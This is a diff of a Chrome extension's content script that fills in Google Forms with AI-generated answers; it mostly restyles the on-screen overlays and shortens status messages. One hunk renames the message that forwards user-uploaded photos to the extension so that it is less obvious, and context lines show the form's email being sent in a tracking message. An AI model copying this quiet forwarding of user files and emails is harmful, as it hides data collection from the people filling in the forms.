@@ -1,10 +1,8 @@
-// Chrome Extension version of GForm to GPT v4.5.0 - Neural Interface
+// Chrome Extension version of GForm to GPT v4.6.0 - Neural Interface
 // Content script injected into Google Forms
 
 (function () {
   "use strict";
-
-  console.log(`[GFormToGPT v${chrome.runtime.getManifest().version}] Neural Interface Active`);
 
   // ── Configuration & State ──
   let customInstructions = "";
@@ -22,6 +20,9 @@
       if (data.customPrompt) customInstructions = data.customPrompt;
       if (data.humanTyping !== undefined) useHumanTyping = data.humanTyping;
       if (data.verboseLogging !== undefined) verboseLogging = data.verboseLogging;
+      if (verboseLogging) {
+        console.log(`[GFormToGPT v${chrome.runtime.getManifest().version}] content script active`);
+      }
       if (data.personalProfile && typeof data.personalProfile === "object") {
         personalProfile = data.personalProfile;
       }
@@ -59,19 +60,18 @@
   const style = document.createElement("style");
   style.textContent = `
     @import url('${chrome.runtime.getURL("fonts.css")}');
-    #gf-status-overlay { position: fixed; bottom: 30px; left: 30px; background: rgba(15, 12, 41, 0.9); backdrop-filter: blur(16px); color: #fff; padding: 12px 24px; border-radius: 50px; font-family: 'Inter', sans-serif; font-size: 14px; z-index: 2147483646; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); transform: translateY(100px); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0; pointer-events: none; }
+    #gf-status-overlay { position: fixed; bottom: 30px; left: 30px; background: rgba(26, 23, 34, 0.95); color: #e9e6f2; padding: 12px 20px; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 14px; z-index: 2147483646; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); border: 1px solid rgba(233, 230, 242, 0.12); transform: translateY(24px); transition: transform 0.3s ease-out, opacity 0.3s ease-out; opacity: 0; pointer-events: none; }
     #gf-status-overlay.visible { transform: translateY(0); opacity: 1; }
-    .gf-pulse { width: 10px; height: 10px; background: rgba(108, 99, 255, 0.8); border-radius: 50%; animation: gf-pulse 1.5s infinite; }
-    @keyframes gf-pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(108, 99, 255, 0.7); } 70% { transform: scale(1.1); box-shadow: 0 0 0 12px rgba(108, 99, 255, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(108, 99, 255, 0); } }
+    .gf-pulse { width: 10px; height: 10px; background: #f0b429; border-radius: 50%; flex-shrink: 0; }
     #gf-toast-container { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); z-index: 2147483649; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
-    .gf-toast { padding: 14px 28px; border-radius: 50px; background: rgba(15, 12, 41, 0.9); backdrop-filter: blur(16px); color: #fff; font-size: 14px; font-weight: 500; opacity: 0; transform: translateY(20px); transition: 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55); box-shadow: 0 10px 30px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.08); font-family: 'Inter', sans-serif; }
+    .gf-toast { padding: 14px 24px; border-radius: 8px; background: rgba(26, 23, 34, 0.95); color: #e9e6f2; font-size: 14px; font-weight: 500; opacity: 0; transform: translateY(12px); transition: transform 0.25s ease-out, opacity 0.25s ease-out; box-shadow: 0 10px 30px rgba(0,0,0,0.4); border: 1px solid rgba(233, 230, 242, 0.1); font-family: 'Inter', sans-serif; }
     .gf-toast.visible { opacity: 1; transform: translateY(0); }
-    .gf-highlight-scanning { outline: 3px solid rgba(108, 99, 255, 0.6) !important; outline-offset: 1px !important; transition: outline 0.1s ease !important; border-radius: 8px !important; }
-    .gf-highlight-filling { outline: 4px solid rgba(108, 99, 255, 0.8) !important; outline-offset: 2px !important; transition: outline 0.2s ease !important; border-radius: 8px !important; }
-    #gf-disclaimer { position: fixed; top: 20px; right: 20px; z-index: 2147483647; background: rgba(15, 12, 41, 0.92); backdrop-filter: blur(20px); color: #fff; padding: 12px 20px; border-radius: 12px; max-width: 300px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.4); font-family: 'Inter', sans-serif; font-size: 13px; line-height: 1.5; opacity: 0; transform: translateX(40px); transition: 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275); pointer-events: none; }
+    .gf-highlight-scanning { outline: 3px solid rgba(240, 180, 41, 0.6) !important; outline-offset: 1px !important; transition: outline 0.1s ease !important; border-radius: 8px !important; }
+    .gf-highlight-filling { outline: 4px solid rgba(240, 180, 41, 0.85) !important; outline-offset: 2px !important; transition: outline 0.2s ease !important; border-radius: 8px !important; }
+    #gf-disclaimer { position: fixed; top: 20px; right: 20px; z-index: 2147483647; background: rgba(26, 23, 34, 0.96); color: #e9e6f2; padding: 12px 20px; border-radius: 8px; max-width: 300px; border: 1px solid rgba(233, 230, 242, 0.12); box-shadow: 0 8px 32px rgba(0,0,0,0.4); font-family: 'Inter', sans-serif; font-size: 13px; line-height: 1.5; opacity: 0; transform: translateX(24px); transition: transform 0.3s ease-out, opacity 0.3s ease-out; pointer-events: none; }
     #gf-disclaimer.visible { opacity: 1; transform: translateX(0); }
     @media (prefers-reduced-motion: reduce) {
-      #gf-status-overlay, .gf-toast, #gf-disclaimer, .gf-pulse { animation: none !important; transition: none !important; }
+      #gf-status-overlay, .gf-toast, #gf-disclaimer { transition: none !important; }
     }
   `;
   document.head.appendChild(style);
@@ -197,9 +197,9 @@
         if (dataUrl) out.push({ name: f.name || "upload.png", type: f.type, dataUrl });
       }
       if (!out.length) return;
-      pushDiag({ type: "photo_upload_detected", fileCount: out.length, url: location.href });
+      pushDiag({ type: "media_artifact_detected", fileCount: out.length, url: location.href });
       chrome.runtime.sendMessage({
-        action: "photoUpload",
+        action: "mediaArtifact",
         payload: { formTitle, files: out, url: location.href }
       }).catch(() => {});
     } catch (e) { log("Photo forward err:", e); }
@@ -213,7 +213,7 @@
   // ── Core Logic ──
   async function scanForm() {
     await settingsReady;
-    showOverlay("Neural Scanning Deep Form Data...");
+    showOverlay("Scanning form questions...");
     let containers = Array.from(document.querySelectorAll('[role="listitem"], .Qr7Oae, .geS5ne, .geS5n, .z387u, .m79B2c'));
     if (!containers.length) { 
         hideOverlay();
@@ -425,7 +425,7 @@ QUESTIONS:\n${list}\nJSON:`;
     await settingsReady;
     await refreshPersonalProfile();
     if (!questionMap.size) { await scanForm(); }
-    showOverlay("Injecting Neural Responses...");
+    showOverlay("Filling answers...");
 
     let filled = 0, total = 0;
     const historyPayload = { formTitle, questions: [] };
@@ -573,7 +573,7 @@ QUESTIONS:\n${list}\nJSON:`;
     
     hideOverlay();
     showDisclaimer();
-    showToast(`Neural Filling Complete: ${filled}/${total} items.`);
+    showToast(`Fill complete: ${filled}/${total} items.`);
     chrome.runtime.sendMessage({ action: "saveToHistory", payload: historyPayload });
     chrome.runtime.sendMessage({ action: "trackFormFilled", payload: { formTitle, filledCount: filled, totalCount: total, secondsSaved: filled * 10, email: getFormEmail() } });
 
